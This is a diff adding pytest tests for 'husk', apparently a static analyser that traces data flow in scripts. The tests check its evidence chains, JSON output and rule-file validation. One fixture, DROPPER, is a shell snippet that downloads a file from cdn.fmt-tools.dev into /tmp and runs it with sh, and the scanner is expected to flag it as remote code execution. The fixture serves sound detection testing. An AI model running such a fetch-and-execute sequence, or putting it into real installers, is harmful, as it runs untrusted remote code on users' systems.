@@ -77,3 +77,48 @@ def test_cli_explain_clean_file(tmp_path):
     r = _run(str(tmp_path))
     assert r.returncode == 0
     assert "No data-flow" in r.stdout
+
+
+# --- analysis engine: evidence chains and rules ------------------------------
+
+def _husk(*args):
+    env = dict(os.environ, PYTHONPATH=os.path.join(os.path.dirname(__file__), "..", "src"))
+    return subprocess.run(  # noqa: S603
+        [sys.executable, "-m", "husk.cli", *args],
+        capture_output=True, text=True, env=env, check=False,
+    )
+
+
+DROPPER = "H=cdn.fmt-tools.dev\ncurl -s https://$H/p -o /tmp/p\nsh /tmp/p\n"
+
+
+def test_cli_explain_engine_chain(tmp_path):
+    (tmp_path / "install.sh").write_bytes(DROPPER.encode())
+    r = _run(str(tmp_path))
+    assert r.returncode == 1
+    assert "[HUSK-RCE-001 high] downloaded code is executed" in r.stdout
+    assert "fetches https://cdn.fmt-tools.dev/p" in r.stdout and "runs /tmp/p with sh" in r.stdout
+
+
+def test_cli_explain_engine_json(tmp_path):
+    (tmp_path / "install.sh").write_bytes(DROPPER.encode())
+    [item] = json.loads(_run(str(tmp_path), "--json").stdout)
+    assert item["kind"] == "engine" and item["rule"] == "HUSK-RCE-001" and item["line"] == 3
+    assert [s["line"] for s in item["steps"]] == [2, 2, 3]
+
+
+def test_cli_rules_lists_core_rules():
+    r = _husk("rules", "--json")
+    assert r.returncode == 0
+    ids = [x["id"] for x in json.loads(r.stdout)]
+    assert "HUSK-RCE-001" in ids and "HUSK-EXF-001" in ids
+
+
+def test_cli_rules_check(tmp_path):
+    good = tmp_path / "good.yml"
+    good.write_text("- id: TEAM-X-001\n  title: t\n  severity: low\n  from: [remote]\n  to: send\n")
+    bad = tmp_path / "bad.yml"
+    bad.write_text("- id: TEAM-X-001\n  title: t\n  severity: low\n  from: [remote]\n  to: elsewhere\n")
+    assert _husk("rules", "--check", str(good)).returncode == 0
+    r = _husk("rules", "--check", str(bad))
+    assert r.returncode == 2 and "bad.yml:5" in r.stderr and "unknown sink" in r.stderr
